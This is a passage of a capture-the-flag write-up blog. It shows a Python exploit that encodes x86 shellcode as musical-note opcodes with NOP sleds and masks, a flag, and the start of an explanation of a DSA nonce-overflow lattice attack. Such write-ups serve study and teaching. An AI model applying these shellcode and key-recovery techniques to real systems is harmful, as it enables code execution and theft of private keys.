</span></span><span class=line><span class=cl><span class=n>n_to_f</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;G#1&#39;</span><span class=p>:</span> <span class=mi>101</span><span class=p>,</span> <span class=s1>&#39;G#0&#39;</span><span class=p>:</span> <span class=mi>51</span><span class=p>,</span> <span class=s1>&#39;G#3&#39;</span><span class=p>:</span> <span class=mi>404</span><span class=p>,</span> <span class=s1>&#39;G#2&#39;</span><span class=p>:</span> <span class=mi>202</span><span class=p>,</span> <span class=s1>&#39;G#5&#39;</span><span class=p>:</span> <span class=mi>1614</span><span class=p>,</span> <span class=s1>&#39;G#4&#39;</span><span class=p>:</span> <span class=mi>807</span><span class=p>,</span> <span class=s1>&#39;G#7&#39;</span><span class=p>:</span> <span class=mi>6456</span><span class=p>,</span> <span class=s1>&#39;G#6&#39;</span><span class=p>:</span> <span class=mi>3228</span><span class=p>,</span> <span class=s1>&#39;G#9&#39;</span><span class=p>:</span> <span class=mi>25823</span><span class=p>,</span> <span class=s1>&#39;G#8&#39;</span><span class=p>:</span> <span class=mi>12912</span><span class=p>,</span> <span class=s1>&#39;G7&#39;</span><span class=p>:</span> <span class=mi>6094</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>:</span> <span class=mi>3047</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>:</span> <span class=mi>1524</span><span class=p>,</span> <span class=s1>&#39;G4&#39;</span><span class=p>:</span> <span class=mi>762</span><span class=p>,</span> <span class=s1>&#39;G3&#39;</span><span class=p>:</span> <span class=mi>381</span><span class=p>,</span> <span class=s1>&#39;G2&#39;</span><span class=p>:</span> <span class=mi>191</span><span class=p>,</span> <span class=s1>&#39;G1&#39;</span><span class=p>:</span> <span class=mi>96</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>:</span> <span class=mi>48</span><span class=p>,</span> <span class=s1>&#39;G9&#39;</span><span class=p>:</span> <span class=mi>24374</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>:</span> <span class=mi>12187</span><span class=p>,</span> <span class=s1>&#39;D#8&#39;</span><span class=p>:</span> <span class=mi>9673</span><span class=p>,</span> <span class=s1>&#39;D#9&#39;</span><span class=p>:</span> <span class=mi>19346</span><span class=p>,</span> <span class=s1>&#39;D#6&#39;</span><span class=p>:</span> <span class=mi>2419</span><span class=p>,</span> <span class=s1>&#39;A8&#39;</span><span class=p>:</span> <span class=mi>6840</span><span class=p>,</span> <span class=s1>&#39;B4&#39;</span><span class=p>:</span> <span class=mi>480</span><span class=p>,</span> <span class=s1>&#39;B5&#39;</span><span class=p>:</span> <span class=mi>960</span><span class=p>,</span> <span class=s1>&#39;B6&#39;</span><span class=p>:</span> <span class=mi>1920</span><span class=p>,</span> <span class=s1>&#39;B7&#39;</span><span class=p>:</span> <span class=mi>3839</span><span class=p>,</span> <span class=s1>&#39;B0&#39;</span><span class=p>:</span> <span class=mi>30</span><span class=p>,</span> <span class=s1>&#39;B1&#39;</span><span class=p>:</span> <span class=mi>60</span><span class=p>,</span> <span class=s1>&#39;B2&#39;</span><span class=p>:</span> <span class=mi>120</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>:</span> <span class=mi>240</span><span class=p>,</span> <span class=s1>&#39;B8&#39;</span><span class=p>:</span> <span class=mi>7678</span><span class=p>,</span> <span class=s1>&#39;B9&#39;</span><span class=p>:</span> <span class=mi>15355</span><span class=p>,</span> <span class=s1>&#39;F#0&#39;</span><span class=p>:</span> <span class=mi>45</span><span class=p>,</span> <span class=s1>&#39;F#1&#39;</span><span class=p>:</span> <span class=mi>90</span><span class=p>,</span> <span class=s1>&#39;F#2&#39;</span><span class=p>:</span> <span class=mi>180</span><span class=p>,</span> <span class=s1>&#39;F#3&#39;</span><span class=p>:</span> <span class=mi>360</span><span class=p>,</span> <span class=s1>&#39;F#4&#39;</span><span class=p>:</span> <span class=mi>719</span><span class=p>,</span> <span class=s1>&#39;F#5&#39;</span><span class=p>:</span> <span class=mi>1438</span><span class=p>,</span> <span class=s1>&#39;F#6&#39;</span><span class=p>:</span> <span class=mi>2876</span><span class=p>,</span> <span class=s1>&#39;F#7&#39;</span><span class=p>:</span> <span class=mi>5752</span><span class=p>,</span> <span class=s1>&#39;F#8&#39;</span><span class=p>:</span> <span class=mi>11503</span><span class=p>,</span> <span class=s1>&#39;F#9&#39;</span><span class=p>:</span> <span class=mi>23006</span><span class=p>,</span> <span class=s1>&#39;E9&#39;</span><span class=p>:</span> <span class=mi>20496</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>:</span> <span class=mi>10248</span><span class=p>,</span> <span class=s1>&#39;E5&#39;</span><span class=p>:</span> <span class=mi>1281</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>:</span> <span class=mi>641</span><span class=p>,</span> <span class=s1>&#39;E7&#39;</span><span class=p>:</span> <span class=mi>5124</span><span class=p>,</span> <span class=s1>&#39;E6&#39;</span><span class=p>:</span> <span class=mi>2562</span><span class=p>,</span> <span class=s1>&#39;E1&#39;</span><span class=p>:</span> <span class=mi>81</span><span class=p>,</span> <span class=s1>&#39;E0&#39;</span><span class=p>:</span> <span class=mi>41</span><span class=p>,</span> <span class=s1>&#39;E3&#39;</span><span class=p>:</span> <span class=mi>321</span><span class=p>,</span> <span class=s1>&#39;E2&#39;</span><span class=p>:</span> <span class=mi>161</span><span class=p>,</span> <span class=s1>&#39;A#3&#39;</span><span class=p>:</span> <span class=mi>227</span><span class=p>,</span> <span class=s1>&#39;A#2&#39;</span><span class=p>:</span> <span class=mi>114</span><span class=p>,</span> <span class=s1>&#39;A#1&#39;</span><span class=p>:</span> <span class=mi>57</span><span class=p>,</span> <span class=s1>&#39;A#0&#39;</span><span class=p>:</span> <span class=mi>29</span><span class=p>,</span> <span class=s1>&#39;A#7&#39;</span><span class=p>:</span> <span class=mi>3624</span><span class=p>,</span> <span class=s1>&#39;A#6&#39;</span><span class=p>:</span> <span class=mi>1812</span><span class=p>,</span> <span class=s1>&#39;A#5&#39;</span><span class=p>:</span> <span class=mi>906</span><span class=p>,</span> <span class=s1>&#39;A#4&#39;</span><span class=p>:</span> <span class=mi>453</span><span class=p>,</span> <span class=s1>&#39;A#9&#39;</span><span class=p>:</span> <span class=mi>14493</span><span class=p>,</span> <span class=s1>&#39;A#8&#39;</span><span class=p>:</span> <span class=mi>7247</span><span class=p>,</span> <span class=s1>&#39;C9&#39;</span><span class=p>:</span> <span class=mi>16268</span><span class=p>,</span> <span class=s1>&#39;C8&#39;</span><span class=p>:</span> <span class=mi>8134</span><span class=p>,</span> <span class=s1>&#39;C3&#39;</span><span class=p>:</span> <span class=mi>255</span><span class=p>,</span> <span class=s1>&#39;C2&#39;</span><span class=p>:</span> <span class=mi>128</span><span class=p>,</span> <span class=s1>&#39;C1&#39;</span><span class=p>:</span> <span class=mi>64</span><span class=p>,</span> <span class=s1>&#39;C0&#39;</span><span class=p>:</span> <span class=mi>32</span><span class=p>,</span> <span class=s1>&#39;C7&#39;</span><span class=p>:</span> <span class=mi>4067</span><span class=p>,</span> <span class=s1>&#39;C6&#39;</span><span class=p>:</span> <span class=mi>2034</span><span class=p>,</span> <span class=s1>&#39;C5&#39;</span><span class=p>:</span> <span class=mi>1017</span><span class=p>,</span> <span class=s1>&#39;C4&#39;</span><span class=p>:</span> <span class=mi>509</span><span class=p>,</span> <span class=s1>&#39;F0&#39;</span><span class=p>:</span> <span class=mi>43</span><span class=p>,</span> <span class=s1>&#39;F1&#39;</span><span class=p>:</span> <span class=mi>85</span><span class=p>,</span> <span class=s1>&#39;F2&#39;</span><span class=p>:</span> <span class=mi>170</span><span class=p>,</span> <span class=s1>&#39;F3&#39;</span><span class=p>:</span> <span class=mi>340</span><span class=p>,</span> <span class=s1>&#39;F4&#39;</span><span class=p>:</span> <span class=mi>679</span><span class=p>,</span> <span class=s1>&#39;F5&#39;</span><span class=p>:</span> <span class=mi>1358</span><span class=p>,</span> <span class=s1>&#39;F6&#39;</span><span class=p>:</span> <span class=mi>2715</span><span class=p>,</span> <span class=s1>&#39;F7&#39;</span><span class=p>:</span> <span class=mi>5429</span><span class=p>,</span> <span class=s1>&#39;F8&#39;</span><span class=p>:</span> <span class=mi>10858</span><span class=p>,</span> <span class=s1>&#39;F9&#39;</span><span class=p>:</span> <span class=mi>21715</span><span class=p>,</span> <span class=s1>&#39;A1&#39;</span><span class=p>:</span> <span class=mi>54</span><span class=p>,</span> <span class=s1>&#39;A0&#39;</span><span class=p>:</span> <span class=mi>27</span><span class=p>,</span> <span class=s1>&#39;A3&#39;</span><span class=p>:</span> <span class=mi>214</span><span class=p>,</span> <span class=s1>&#39;A2&#39;</span><span class=p>:</span> <span class=mi>107</span><span class=p>,</span> <span class=s1>&#39;A5&#39;</span><span class=p>:</span> <span class=mi>855</span><span class=p>,</span> <span class=s1>&#39;A4&#39;</span><span class=p>:</span> <span class=mi>428</span><span class=p>,</span> <span class=s1>&#39;A7&#39;</span><span class=p>:</span> <span class=mi>3420</span><span class=p>,</span> <span class=s1>&#39;A6&#39;</span><span class=p>:</span> <span class=mi>1710</span><span class=p>,</span> <span class=s1>&#39;A9&#39;</span><span class=p>:</span> <span class=mi>13680</span><span class=p>,</span> <span class=s1>&#39;D#7&#39;</span><span class=p>:</span> <span class=mi>4837</span><span class=p>,</span> <span class=s1>&#39;D#4&#39;</span><span class=p>:</span> <span class=mi>605</span><span class=p>,</span> <span class=s1>&#39;D#5&#39;</span><span class=p>:</span> <span class=mi>1210</span><span class=p>,</span> <span class=s1>&#39;D#2&#39;</span><span class=p>:</span> <span class=mi>152</span><span class=p>,</span> <span class=s1>&#39;D#3&#39;</span><span class=p>:</span> <span class=mi>303</span><span class=p>,</span> <span class=s1>&#39;D#0&#39;</span><span class=p>:</span> <span class=mi>38</span><span class=p>,</span> <span class=s1>&#39;D#1&#39;</span><span class=p>:</span> <span class=mi>76</span><span class=p>,</span> <span class=s1>&#39;C#9&#39;</span><span class=p>:</span> <span class=mi>17235</span><span class=p>,</span> <span class=s1>&#39;C#8&#39;</span><span class=p>:</span> <span class=mi>8618</span><span class=p>,</span> <span class=s1>&#39;C#5&#39;</span><span class=p>:</span> <span class=mi>1078</span><span class=p>,</span> <span class=s1>&#39;C#4&#39;</span><span class=p>:</span> <span class=mi>539</span><span class=p>,</span> <span class=s1>&#39;C#7&#39;</span><span class=p>:</span> <span class=mi>4309</span><span class=p>,</span> <span class=s1>&#39;C#6&#39;</span><span class=p>:</span> <span class=mi>2155</span><span class=p>,</span> <span class=s1>&#39;C#1&#39;</span><span class=p>:</span> <span class=mi>68</span><span class=p>,</span> <span class=s1>&#39;C#0&#39;</span><span class=p>:</span> <span class=mi>34</span><span class=p>,</span> <span class=s1>&#39;C#3&#39;</span><span class=p>:</span> <span class=mi>270</span><span class=p>,</span> <span class=s1>&#39;C#2&#39;</span><span class=p>:</span> <span class=mi>135</span><span class=p>,</span> <span class=s1>&#39;D8&#39;</span><span class=p>:</span> <span class=mi>9130</span><span class=p>,</span> <span class=s1>&#39;D9&#39;</span><span class=p>:</span> <span class=mi>18260</span><span class=p>,</span> <span class=s1>&#39;D6&#39;</span><span class=p>:</span> <span class=mi>2283</span><span class=p>,</span> <span class=s1>&#39;D7&#39;</span><span class=p>:</span> <span class=mi>4565</span><span class=p>,</span> <span class=s1>&#39;D4&#39;</span><span class=p>:</span> <span class=mi>571</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>:</span> <span class=mi>1142</span><span class=p>,</span> <span class=s1>&#39;D2&#39;</span><span class=p>:</span> <span class=mi>143</span><span class=p>,</span> <span class=s1>&#39;D3&#39;</span><span class=p>:</span> <span class=mi>286</span><span class=p>,</span> <span class=s1>&#39;D0&#39;</span><span class=p>:</span> <span class=mi>36</span><span class=p>,</span> <span class=s1>&#39;D1&#39;</span><span class=p>:</span> <span class=mi>72</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>encoder</span><span class=p>(</span><span class=n>note</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>note</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1>#print note[i:i+2]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>i</span><span class=o>+</span><span class=mi>2</span> <span class=o>&lt;=</span> <span class=nb>len</span><span class=p>(</span><span class=n>note</span><span class=p>)</span> <span class=ow>and</span> <span class=n>note</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>]</span> <span class=ow>in</span> <span class=n>n_to_f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>+=</span> <span class=n>p16</span><span class=p>(</span><span class=n>n_to_f</span><span class=p>[</span><span class=n>note</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>]])</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>i</span><span class=o>+</span><span class=mi>3</span> <span class=o>&lt;=</span> <span class=nb>len</span><span class=p>(</span><span class=n>note</span><span class=p>)</span> <span class=ow>and</span> <span class=n>note</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>3</span><span class=p>]</span> <span class=ow>in</span> <span class=n>n_to_f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>+=</span> <span class=n>p16</span><span class=p>(</span><span class=n>n_to_f</span><span class=p>[</span><span class=n>note</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>3</span><span class=p>]])</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span> <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>MASK1</span> <span class=o>=</span> <span class=mh>0x40404800</span>
</span></span><span class=line><span class=cl><span class=n>MASK2</span> <span class=o>=</span> <span class=mh>0x60606800</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>SETEAX</span> <span class=o>=</span> <span class=n>set_eax</span><span class=p>(</span><span class=mh>0x40404a4b</span><span class=p>,</span> <span class=mh>0x0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>md</span> <span class=o>=</span> <span class=n>Cs</span><span class=p>(</span><span class=n>CS_ARCH_X86</span><span class=p>,</span> <span class=n>CS_MODE_32</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>baseaddr</span> <span class=o>=</span> <span class=mh>0x60606000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>disasm</span><span class=p>(</span><span class=n>code</span><span class=p>,</span> <span class=n>address</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>instructions</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>regex</span> <span class=o>=</span> <span class=sa>r</span><span class=s1>&#39;ptr \[e[bcd]x&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>size</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>md</span><span class=o>.</span><span class=n>disasm</span><span class=p>(</span><span class=n>code</span><span class=p>,</span> <span class=n>address</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>size</span> <span class=o>+=</span> <span class=n>i</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>        <span class=n>instructions</span> <span class=o>+=</span> <span class=s1>&#39;</span><span class=si>%s</span><span class=s1> </span><span class=si>%s</span><span class=s1>; &#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>i</span><span class=o>.</span><span class=n>mnemonic</span><span class=p>,</span> <span class=n>i</span><span class=o>.</span><span class=n>op_str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=n>regex</span><span class=p>,</span> <span class=n>i</span><span class=o>.</span><span class=n>op_str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>size</span> <span class=o>!=</span> <span class=nb>len</span><span class=p>(</span><span class=n>code</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>instructions</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># SET_EAX = [&#39;D5&#39;, &#39;G6&#39;, &#39;E4&#39;, &#39;D5&#39;, &#39;E0&#39;, &#39;D1&#39;, &#39;B3&#39;, &#39;G8&#39;, &#39;G8&#39;, &#39;G0&#39;, &#39;G8&#39;, &#39;G0&#39;, &#39;G8&#39;, &#39;G0&#39;, &#39;G8&#39;, &#39;G0&#39;, &#39;G8&#39;, &#39;G0&#39;, &#39;G8&#39;, &#39;G0&#39;, &#39;G8&#39;, &#39;G0&#39;, &#39;G8&#39;, &#39;G0&#39;, &#39;G8&#39;, &#39;G0&#39;, &#39;G8&#39;, &#39;G0&#39;, &#39;G8&#39;, &#39;G0&#39;, &#39;G8&#39;, &#39;G0&#39;, &#39;G8&#39;, &#39;G0&#39;, &#39;G8&#39;, &#39;G0&#39;, &#39;B3&#39;, &#39;G8&#39;, &#39;G8&#39;, &#39;G0&#39;, &#39;G8&#39;, &#39;G0&#39;, &#39;B3&#39;, &#39;G8&#39;]</span>
</span></span><span class=line><span class=cl><span class=c1>#set eax to 0x40404a4b (== &amp;mask1)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>SETEAX</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s1>&#39;C#8&#39;</span><span class=p>)</span>   <span class=c1>#inc ebx; and edi, dword ptr [eax]; eax must point to mask1 0x4040404xxx</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s1>&#39;C#7&#39;</span><span class=p>)</span>   <span class=c1>#inc ebx; and esi, dword ptr [edi];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># copy primitive assume we&#39;re writing to space memset to \x00</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>COPY</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># store the current value of al so we can xor back</span>
</span></span><span class=line><span class=cl><span class=n>COPY</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s1>&#39;B0F1&#39;</span><span class=p>)</span>     <span class=c1>#inc edx; xor byte ptr [esi + 0x31], al;</span>
</span></span><span class=line><span class=cl><span class=n>COPY</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s1>&#39;B2F4&#39;</span><span class=p>)</span>     <span class=c1>#inc edx; xor al, byte ptr [esi + 0x34];  next note-nop after three bytes use it to xor happily</span>
</span></span><span class=line><span class=cl><span class=c1># NOP is 2 bytes, we can use this to xor out stuff</span>
</span></span><span class=line><span class=cl><span class=n>COPY</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s1>&#39;G2G8&#39;</span><span class=p>)</span>     <span class=c1>#inc edi; xor al, byte ptr [edi + 0x38];</span>
</span></span><span class=line><span class=cl><span class=n>COPY</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s1>&#39;B0F1&#39;</span><span class=p>)</span>     <span class=c1>#inc edx; xor byte ptr [esi + 0x31], al;</span>
</span></span><span class=line><span class=cl><span class=n>COPY</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s1>&#39;F7&#39;</span><span class=p>)</span>       <span class=c1>#inc esi; aaa;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>write must be aligned to &#34;NOTE-NOP&#34; opcodes, we can use a different version of this 
</span></span></span><span class=line><span class=cl><span class=s2>depending on &#34;nop&#34; alignment :)
</span></span></span><span class=line><span class=cl><span class=s2>COPY += encoder(&#39;B0F0&#39;)     #inc edx; xor byte ptr [esi + 0x30], al;
</span></span></span><span class=line><span class=cl><span class=s2>COPY += encoder(&#39;B2F2&#39;)     #inc edx; xor al, byte ptr [esi + 0x32];
</span></span></span><span class=line><span class=cl><span class=s2># NOP is 2 bytes, we can use this to xor out stuff
</span></span></span><span class=line><span class=cl><span class=s2>COPY += encoder(&#39;G2G8&#39;)     #inc edi; xor al, byte ptr [edi + 0x38];
</span></span></span><span class=line><span class=cl><span class=s2>COPY += encoder(&#39;B0F0&#39;)     #inc edx; xor byte ptr [esi + 0x30], al;
</span></span></span><span class=line><span class=cl><span class=s2>COPY += encoder(&#39;F7&#39;)       #inc esi; aaa;
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=n>xrange</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>COPY</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mask_delta</span> <span class=o>=</span> <span class=p>(</span><span class=mh>0x800</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span> <span class=o>-</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>n_nops</span> <span class=o>=</span> <span class=p>(</span><span class=n>mask_delta</span> <span class=o>/</span> <span class=mi>2</span> <span class=p>)</span>             <span class=c1># a single note is encoded in a word</span>
</span></span><span class=line><span class=cl><span class=n>NOPS</span> <span class=o>=</span> <span class=n>encoder</span><span class=p>(</span><span class=n>DNOP</span><span class=p>)</span> <span class=o>*</span> <span class=n>n_nops</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>NOPS</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xff\xff</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># payload += encoder(&#39;G3G2&#39;)           #inc edi; xor eax, dword ptr [edi + 0x30];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=nb>hex</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># mask to let us use \x00 (add    BYTE PTR [eax],al) as nop</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0x800</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span> <span class=o>==</span> <span class=mh>0x800</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>MASK2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;b&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0x838</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;c&#39;</span> <span class=o>+</span> <span class=n>shellcode</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;d&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0xa4b</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>MASK1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;</span><span class=se>\x00\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#print SETEAX</span>
</span></span><span class=line><span class=cl><span class=c1>#print &#39;\n&#39;.join(disasm(&#39;&#39;.join(SETEAX), baseaddr).split(&#39;;&#39;))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;payload&#39;</span><span class=p>,</span><span class=s1>&#39;w&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>p = process(&#39;./nop&#39;)
</span></span></span><span class=line><span class=cl><span class=s2>p.sendline(payload)
</span></span></span><span class=line><span class=cl><span class=s2>p.readline()
</span></span></span><span class=line><span class=cl><span class=s2>p.readline()
</span></span></span><span class=line><span class=cl><span class=s2>if r:
</span></span></span><span class=line><span class=cl><span class=s2>    print &#39;WOOOOOOOOOO </span><span class=si>%s</span><span class=s2>&#39; </span><span class=si>% r</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span></code></pre></div><h3 class="relative group">Epilogue<div id=epilogue class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#epilogue aria-label=Anchor>#</a></span></h3><p>We developed the three exploits in parallel.
The Second exploit was the first to be ready, but unfortunately we set the solver to use a <code>0xff</code> we found on the stack and it worked in every laptop in the lab but not in remote&mldr;..<br>The First exploit was the second to be ready and succesfully led us to the flag.<br>We finished the Third exploit just beacause we enjoyed the challenge and thought it was an elegant idea!</p><p>Oh, the flag was:<br><code>OOO{1f_U_Ar3_r34d1n6_7h15_y0u_4r3_7h3_m0z4rT_0f_1nf053c_Ch33rs2MP!}</code></p><h2 class="relative group">Official<div id=official class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#official aria-label=Anchor>#</a></span></h2><p>We are given a x86_64 ELF</p><ul><li>we can Sign a command (allowed ls&mldr;, stat&mldr;, du&mldr; , forbidden cat flag) and get a signature (r,s)</li><li>we can Execute a command if we provide a signature (r,s)</li></ul><p>By examining the binary we understand that it signs the command with DSA. The public parameters are hard coded in the binary as strings, while the private parameter is loaded from a file.</p><p>This is the signing process:</p><ol><li>The DSA nonce is generated reading 0x14 bytes from /dev/urandom and stored in a global variable (k), the random bytes are later shuffled during the signing process</li><li>The input is then read, up to 256 bytes. There is a buffer overflow (at offset 0x1D26): with a 256 byte long input, the first byte of k is overwritten by a null byte</li><li>k is then shuffled, and the overwritten byte is moved from the first position (k[0]) to the last (k[19])</li><li>k is interpreted as an hex number</li></ol><p>This means that we can reliably and consistently set the least significant byte of k to a fixed amount(0x00).</p><p>DSA is vulnerable to faults in the secrets, so even a few constant bits can compromise the private key.</p><p>By reading <a href=https://hal.inria.fr/hal-00777804/document target=_blank>this paper</a>, we decided to implement a lattice attack on the alghorithm.</p><p>We estimated that we needed ~70 faulted signatures to be able to implement the attack (and to guarantee that the SVP solution contained the private key).</p><h3 class="relative group">Solver<div id=solver class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a 